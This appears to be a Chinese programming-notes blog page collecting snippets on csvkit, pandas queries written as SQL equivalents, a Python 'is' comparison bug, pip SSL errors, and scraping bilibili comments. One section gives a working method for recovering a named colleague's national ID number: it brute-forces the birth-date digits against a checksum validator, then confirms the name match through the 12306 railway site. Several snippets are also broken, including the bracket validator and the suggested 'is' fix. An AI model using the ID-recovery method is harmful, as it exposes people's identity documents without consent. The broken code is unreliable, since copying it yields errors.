<h3 id="命令行里处理数据科学问题"><a href="#命令行里处理数据科学问题" class="headerlink" title="命令行里处理数据科学问题"></a>命令行里处理数据科学问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">curl -o data_dl.csv https:<span class="comment">//archive.ics.uci.edu/ml/machine-learning-databases/blood-transfusion/transfusion.data</span></span><br><span class="line">Recency (months),Frequency (times),Monetary (c.c. blood),Time (months),<span class="string">"whether he/she donated blood in March 2007"</span></span><br><span class="line"><span class="number">2</span> ,<span class="number">50</span>,<span class="number">12500</span>,<span class="number">98</span> ,<span class="number">1</span></span><br><span class="line"><span class="number">0</span> ,<span class="number">13</span>,<span class="number">3250</span>,<span class="number">28</span> ,<span class="number">1</span></span><br><span class="line"><span class="number">1</span> ,<span class="number">16</span>,<span class="number">4000</span>,<span class="number">35</span> ,<span class="number">1</span></span><br><span class="line"><span class="number">2</span> ,<span class="number">20</span>,<span class="number">5000</span>,<span class="number">45</span> ,<span class="number">1</span></span><br><span class="line"><span class="number">1</span> ,<span class="number">24</span>,<span class="number">6000</span>,<span class="number">77</span> ,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">pip install csvkit</span><br><span class="line">csvclean data_dl.csv</span><br><span class="line">csvcut -n data_dl_out.csv | cut -c6-</span><br><span class="line">Recency (months)</span><br><span class="line">Frequency (times)</span><br><span class="line">Monetary (c.c. blood)</span><br><span class="line">Time (months)</span><br><span class="line">whether he/she donated blood <span class="keyword">in</span> March <span class="number">2007</span></span><br><span class="line"></span><br><span class="line">csvstat --mean data_dl_out.csv</span><br><span class="line"><span class="number">1.</span> a: <span class="number">373.5</span></span><br><span class="line"><span class="number">2.</span> Recency (months): <span class="number">9.507</span></span><br><span class="line"><span class="number">3.</span> Frequency (times): <span class="number">5.515</span></span><br><span class="line"><span class="number">4.</span> Monetary (c.c. blood): <span class="number">1</span>,<span class="number">378.676</span></span><br><span class="line"><span class="number">5.</span> Time (months): <span class="number">34.282</span></span><br><span class="line"><span class="number">6.</span> whether he/she donated blood <span class="keyword">in</span> March <span class="number">2007</span>: None</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">'data_dl_out.csv'</span>)</span><br><span class="line">data.head()</span><br><span class="line"></span><br><span class="line">data = data.rename(columns=&#123;<span class="string">'Recency (months)'</span>: <span class="string">'recency'</span>,</span><br><span class="line">             <span class="string">'Frequency (times)'</span>: <span class="string">'frequency'</span>,</span><br><span class="line">             <span class="string">'Monetary (c.c. blood)'</span>: <span class="string">'volumne'</span>,</span><br><span class="line">             <span class="string">'Time (months)'</span>: <span class="string">'time'</span>,</span><br><span class="line">             <span class="string">'whether he/she donated blood in March 2007'</span>: <span class="string">'target'</span>&#125;)</span><br><span class="line">data.to_csv(<span class="string">'data_clean.csv'</span>)</span><br><span class="line"></span><br><span class="line">	recency	frequency	volumne	time	target</span><br><span class="line"><span class="number">0</span>	<span class="number">2</span>	<span class="number">50</span>	<span class="number">12500</span>	<span class="number">98</span>	<span class="number">1</span></span><br><span class="line"><span class="number">1</span>	<span class="number">0</span>	<span class="number">13</span>	<span class="number">3250</span>	<span class="number">28</span>	<span class="number">1</span></span><br><span class="line"><span class="number">2</span>	<span class="number">1</span>	<span class="number">16</span>	<span class="number">4000</span>	<span class="number">35</span>	<span class="number">1</span></span><br><span class="line"><span class="number">3</span>	<span class="number">2</span>	<span class="number">20</span>	<span class="number">5000</span>	<span class="number">45</span>	<span class="number">1</span></span><br><span class="line"></span><br><span class="line">csvsql --query  <span class="string">"select frequency, count(*) as rows from data_clean where target = 1 group by frequency order by 2 desc"</span> data_clean.csv</span><br><span class="line">d:\python\lib\site-packages\win32\lib\pywintypes.py:<span class="number">2</span>: DeprecationWarning: the imp <span class="built_in">module</span> is deprecated <span class="keyword">in</span> favour <span class="keyword">of</span> importlib; see the <span class="built_in">module</span><span class="string">'s documentation for alternative uses</span></span><br><span class="line"><span class="string">d:\python\lib\site-packages\agate\utils.py:276: UnnamedColumnWarning: Column 0 has no name. Using "a".</span></span><br><span class="line"><span class="string">frequency,rows</span></span><br><span class="line"><span class="string">1.0,20</span></span><br><span class="line"><span class="string">5.0,20</span></span><br><span class="line"><span class="string">2.0,19</span></span><br><span class="line"><span class="string">6.0,17</span></span><br><span class="line"><span class="string">https://oicebot.github.io/2019/07/25/five-command-line-tools-for-data-science.html</span></span><br></pre></td></tr></table></figure>
<h3 id="Pandas-做数据分析sql"><a href="#Pandas-做数据分析sql" class="headerlink" title="Pandas 做数据分析sql"></a>Pandas 做数据分析sql</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">url = (<span class="string">'https://raw.github.com/pandas-dev/pandas/master/pandas/tests/data/tips.csv'</span>)</span><br><span class="line">tips = pd.read_csv(url)</span><br><span class="line">output = tips.head()</span><br><span class="line">sql 语句： SELECT total_bill, tip, smoker, time FROM tips LIMIT <span class="number">5</span>;。</span><br><span class="line"></span><br><span class="line">output = tips[[<span class="string">'total_bill'</span>, <span class="string">'tip'</span>, <span class="string">'smoker'</span>, <span class="string">'time'</span>]].head(<span class="number">5</span>)</span><br><span class="line">   total_bill   tip smoker    time</span><br><span class="line"><span class="number">0</span>       <span class="number">16.99</span>  <span class="number">1.01</span>     No  Dinner</span><br><span class="line"><span class="number">1</span>       <span class="number">10.34</span>  <span class="number">1.66</span>     No  Dinner</span><br><span class="line"><span class="number">2</span>       <span class="number">21.01</span>  <span class="number">3.50</span>     No  Dinner</span><br><span class="line"><span class="number">3</span>       <span class="number">23.68</span>  <span class="number">3.31</span>     No  Dinner</span><br><span class="line"><span class="number">4</span>       <span class="number">24.59</span>  <span class="number">3.61</span>     No  Dinner</span><br><span class="line">sql 语句： SELECT * FROM tips WHERE time = <span class="string">'Dinner'</span> LIMIT <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">output = tips[tips[<span class="string">'time'</span>] == <span class="string">'Dinner'</span>].head(<span class="number">5</span>)</span><br><span class="line"># 或者</span><br><span class="line">output = tips.query(<span class="string">"time == 'Dinner'"</span>).head(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">sql 语句：SELECT * FROM tips WHERE time = <span class="string">'Dinner'</span>;。</span><br><span class="line"></span><br><span class="line">output = tips[(tips[<span class="string">'time'</span>] == <span class="string">'Dinner'</span>)]</span><br><span class="line">sql 语句：SELECT * FROM tips WHERE time = <span class="string">'Dinner'</span> AND tip &gt; <span class="number">5.00</span>;</span><br><span class="line"></span><br><span class="line">output = tips[(tips[<span class="string">'time'</span>] == <span class="string">'Dinner'</span>) &amp; (tips[<span class="string">'tip'</span>] &gt; <span class="number">5.00</span>)]</span><br><span class="line">sql 语句：SELECT * FROM tips WHERE size &gt;= <span class="number">5</span> OR total_bill &gt; <span class="number">45</span>;。</span><br><span class="line"></span><br><span class="line">output = tips[(tips[<span class="string">'size'</span>] &gt;= <span class="number">5</span>) | (tips[<span class="string">'total_bill'</span>] &gt; <span class="number">45</span>)]</span><br><span class="line">sql 语句：SELECT * FROM tips WHERE siez <span class="keyword">in</span> (<span class="number">5</span>, <span class="number">6</span>);。</span><br><span class="line"></span><br><span class="line">output = tips[tips[<span class="string">'size'</span>].isin([<span class="number">2</span>, <span class="number">5</span>])]</span><br><span class="line">sql 语句：SELECT sex, count(*) FROM tips GROUP BY sex;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29825#replies</span></span><br><span class="line">output = tips.groupby(<span class="string">'sex'</span>).size()</span><br><span class="line">转数组</span><br><span class="line">&gt;&gt;&gt; tips.total_bill.head().tolist()</span><br><span class="line">[<span class="number">16.99</span>, <span class="number">10.34</span>, <span class="number">21.01</span>, <span class="number">23.68</span>, <span class="number">24.59</span>]</span><br><span class="line">&gt;&gt;&gt; tips.columns.tolist()</span><br><span class="line">[<span class="string">'total_bill'</span>, <span class="string">'tip'</span>, <span class="string">'sex'</span>, <span class="string">'smoker'</span>, <span class="string">'day'</span>, <span class="string">'time'</span>, <span class="string">'size'</span>]</span><br></pre></td></tr></table></figure>
<h3 id="在-Python-里用-is-进行比较"><a href="#在-Python-里用-is-进行比较" class="headerlink" title="在 Python 里用 is 进行比较"></a>在 Python 里用 is 进行比较</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> appointment.time_slot_id is time_slot.id:</span><br><span class="line">    time_slot_appointments.append(appointment)</span><br><span class="line">出问题的地方就是这个 is 啦。但最诡异的是，当 time_slot_id 和 time_slot.id 都是小于等于 <span class="number">256</span> 的整型数字时，这段代码一点问题都没有；只有当预约数量达到一定程度，使得 time_slot_id 或 time_slot.id 大于 <span class="number">256</span> 时，问题就出现了——这个表达式永远返回 False</span><br><span class="line"></span><br><span class="line">使用 is 关键字进行的比较是“引用比较”。这里的“引用”就相当于一个索引号，一个地址，或是指向一个对象的指针。用 is 进行比较正是造成这个奇怪 bug 的根源。</span><br><span class="line">使用 == 操作符进行的比较是“值比较”，也就是比较两个对象的“值”。</span><br><span class="line">在 Python 中，数值型的整型数据是以 PyObject 对象的一个子类型： PyLong 对象的形式存储的。为了减少内存管理在处理小整型数字时候的开销，在 CPython 解释器中使用了“小整数对象池”进行优化。也就是说，值为 <span class="number">-5</span> 到 <span class="number">256</span> 的 PyLong 对象已经预置在 CPython 解释器的私有堆中，可以通过 small_ints 这个数组进行访问。</span><br><span class="line">要想修复这个 bug，其中一种方式是，把：</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> appointment.time_slot_id is time_slot.id:</span><br><span class="line">改成：</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> appointment.time_slot.id is time_slot.id:</span><br><span class="line">只有当你十分确定要比较的是两个对象本身的时候，才用 is 进行比较。https:<span class="comment">//oicebot.github.io/2019/07/11/the-dangers-of-using-is-in-python.html</span></span><br></pre></td></tr></table></figure>
<h3 id="判断括号字符串"><a href="#判断括号字符串" class="headerlink" title="判断括号字符串"></a>判断括号字符串</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def isValid(self, s):</span><br><span class="line">    stack = []</span><br><span class="line">    paren_map = &#123;<span class="string">')'</span>:<span class="string">'('</span>, <span class="string">']'</span>:<span class="string">'['</span>, <span class="string">'&#125;'</span>:<span class="string">'&#123;'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c not <span class="keyword">in</span> paren_map:</span><br><span class="line">            stack.apend(c)</span><br><span class="line">        elif not stack or paren[c] != stack.pop():</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">return</span> not stack</span><br></pre></td></tr></table></figure>
<h3 id="Could-not-fetch-URL-https-pypi-org-simple-pip-There-was-a-problem-confirming-the-ssl-certificate"><a href="#Could-not-fetch-URL-https-pypi-org-simple-pip-There-was-a-problem-confirming-the-ssl-certificate" class="headerlink" title="Could not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate"></a>Could not fetch URL <a href="https://pypi.org/simple/pip/" target="_blank" rel="noopener">https://pypi.org/simple/pip/</a>: There was a problem confirming the ssl certificate</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pip install iredis</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">4</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/i</span>redis/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">3</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/i</span>redis/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">2</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/i</span>redis/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">1</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/i</span>redis/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">0</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/i</span>redis/</span><br><span class="line">Could not fetch URL https:<span class="comment">//pypi.org/simple/iredis/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/iredis/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))) - skipping</span></span><br><span class="line">ERROR: Could not find a version that satisfies the requirement iredis (<span class="keyword">from</span> versions: none)</span><br><span class="line">ERROR: No matching distribution found <span class="keyword">for</span> iredis</span><br><span class="line">Could not fetch URL https:<span class="comment">//pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))) - skipping</span></span><br><span class="line">到https:<span class="comment">//pypi.python.org/pypi/pip#downloads下载 https://files.pythonhosted.org/packages/ce/ea/9b445176a65ae4ba22dce1d93e4b5fe182f953df71a145f557cffaffc1bf/pip-19.3.1.tar.gz</span></span><br><span class="line"></span><br><span class="line">解压出setup.py   执行python setup.py install</span><br><span class="line">Installing pip.exe script to D:\python\Scripts</span><br><span class="line">Installing pip.exe.manifest script to D:\python\Scripts</span><br><span class="line">Installing pip3-script.py script to D:\python\Scripts</span><br><span class="line">Installing pip3.exe script to D:\python\Scripts</span><br><span class="line">Installing pip3.exe.manifest script to D:\python\Scripts</span><br><span class="line">Installing pip3<span class="number">.7</span>-script.py script to D:\python\Scripts</span><br><span class="line">Installing pip3<span class="number">.7</span>.exe script to D:\python\Scripts</span><br><span class="line">Installing pip3<span class="number">.7</span>.exe.manifest script to D:\python\Scripts</span><br><span class="line"></span><br><span class="line">Installed d:\python\lib\site-packages\pip<span class="number">-19.3</span><span class="number">.1</span>-py3<span class="number">.7</span>.egg</span><br><span class="line">Processing dependencies <span class="keyword">for</span> pip==<span class="number">19.3</span><span class="number">.1</span></span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> pip==<span class="number">19.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org iredis</span><br><span class="line">Collecting iredis</span><br><span class="line">  Downloading https:<span class="comment">//files.pythonhosted.org/packages/5c/1f/2da6df9c698a586f66bbb4153b7b2a75c62ce1e94aaf04ffaed1954163ad/iredis-0.7.0-py3-none-any.whl (42kB)</span></span><br><span class="line">     |████████████████████████████████| <span class="number">51</span>kB <span class="number">363</span>kB/s</span><br><span class="line">Collecting click8&lt;<span class="number">9</span>,&gt;=<span class="number">8</span></span><br></pre></td></tr></table></figure>
<h3 id="单行代码"><a href="#单行代码" class="headerlink" title="单行代码"></a>单行代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 字典推导</span><br><span class="line">&#123;<span class="attr">v</span>: k <span class="keyword">for</span> k, v <span class="keyword">in</span> some_dict.items()&#125;</span><br><span class="line"># 集合推导</span><br><span class="line">&#123;x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"># 列表推导</span><br><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>) <span class="keyword">if</span> i % <span class="number">3</span> is <span class="number">0</span>]</span><br><span class="line">a_list = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line">print(list(itertools.chain.from_iterable(a_list)))</span><br><span class="line"># Output: [1, 2, 3, 4, 5, 6]</span><br><span class="line">sum(a_list,[])</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"># or</span><br><span class="line">print(list(itertools.chain(*a_list)))</span><br><span class="line"># Output: [1, 2, 3, 4, 5, 6]</span><br><span class="line">python -c <span class="string">"import csv,json;print json.dumps(list(csv.reader(open('csv_file.csv'))))"</span></span><br><span class="line">python -m cProfile my_script.py</span><br><span class="line">cat file.json | python -m json.tool</span><br><span class="line">https:<span class="comment">//learnku.com/articles/39048#reply125307</span></span><br></pre></td></tr></table></figure>
<h3 id="python算出了同事的身份证号码"><a href="#python算出了同事的身份证号码" class="headerlink" title="python算出了同事的身份证号码"></a>python算出了同事的身份证号码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://mp.weixin.qq.com/s?__biz=MzU5MjI3NzIxMw==&amp;mid=2247486816&amp;idx=1&amp;sn=baa976db515e3b9b99e7001daa9a577a&amp;chksm=fe2376d2c954ffc486625e5420e3ebcf3d83581986b0568b804fb5a54e4aaa032b4992c13905&amp;mpshare=1&amp;scene=1&amp;srcid=1023PX0DRWmDc5E8oEZSVUx6&amp;sharer_sharetime=1571795782903&amp;sharer_shareid=43165518fc08bc947dca48788293333a&amp;key=6f23511bf9e1c01f4c78d4f8f46e1b1e8fc6e548405a6029e3b015de7441c1527cd4817fc238470a3211f36f03178e6f7f9888d5f7d1ee5e6ef6b0b0fced5da2f45aa739e184ae5749a86f5102efd4f9&amp;ascene=1&amp;uin=NjQ3OTQwMTAy&amp;devicetype=Windows+7&amp;version=62070152&amp;lang=zh_CN&amp;pass_ticket=Nl73k%2FpmXYhrLnAbsjSStmagh1FEZZkB8fhtyVf9%2BmzY8foNNpPw%2FmaVHa2zPKdu</span></span><br><span class="line"></span><br><span class="line">用python生成<span class="number">1993</span>年的所有日期吧</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">#生成出生当年所有日期</span><br><span class="line">def dateRange(year):</span><br><span class="line">    fmt = <span class="string">'%Y-%m-%d'</span></span><br><span class="line">    bgn = int(time.mktime(time.strptime(year+<span class="string">'-01-01'</span>,fmt)))</span><br><span class="line">    end = int(time.mktime(time.strptime(year+<span class="string">'-12-31'</span>,fmt)))</span><br><span class="line">    list_date = [time.strftime(fmt,time.localtime(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(bgn,end+<span class="number">1</span>,<span class="number">3600</span>*<span class="number">24</span>)]</span><br><span class="line">    <span class="keyword">return</span> [i.replace(<span class="string">'-'</span>,<span class="string">''</span>) <span class="keyword">for</span> i <span class="keyword">in</span> list_date]</span><br><span class="line"></span><br><span class="line">data_time  = dateRange(<span class="string">'1993'</span>)</span><br><span class="line">pip install id-validator</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> id_validator <span class="keyword">import</span> validator</span><br><span class="line"></span><br><span class="line">#遍历所有日期，print通过校验的身份证号码</span><br><span class="line"></span><br><span class="line">def vali_dator(id1,id2,id3):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dateRange(id2):</span><br><span class="line">        theid = id1 + i + id3</span><br><span class="line">        <span class="keyword">if</span> validator.is_valid(theid):</span><br><span class="line">            print(theid)</span><br><span class="line"></span><br><span class="line">vali_dator(<span class="string">'330221'</span>,<span class="string">'1993'</span>,<span class="string">'4914'</span>)</span><br><span class="line">打开<span class="number">12306</span>官网，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在<span class="number">12306</span>添加常用联系人，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">将李大伟+身份证号依次输入。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">若身份证和姓名一致，就会显示校验通过；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">若不能通过，则说明身份证和姓名不一致。 https:<span class="comment">//github.com/zpw1995/aotodata/tree/master/interest/ID_card</span></span><br></pre></td></tr></table></figure>
<h3 id="b站弹幕"><a href="#b站弹幕" class="headerlink" title="b站弹幕"></a>b站弹幕</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">#https://github.com/zpw1995/aotodata/blob/master/bilibili_danmu/B%E7%AB%99%E5%BC%B9%E5%B9%95%E7%88%AC%E8%99%AB.py</span><br><span class="line">url = <span class="string">'http://comment.bilibili.com/123519261.xml'</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line">html.encoding=<span class="string">'utf8'</span></span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html.text, <span class="string">'lxml'</span>)</span><br><span class="line">results = soup.find_all(<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line">comments = [comment.text <span class="keyword">for</span> comment <span class="keyword">in</span> results]</span><br><span class="line">comments_dict = &#123;<span class="string">'comments'</span>: comments&#125;</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(comments_dict)</span><br><span class="line">df.to_csv(<span class="string">'bili_ai5.csv'</span>, encoding=<span class="string">'utf-8-sig'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"> 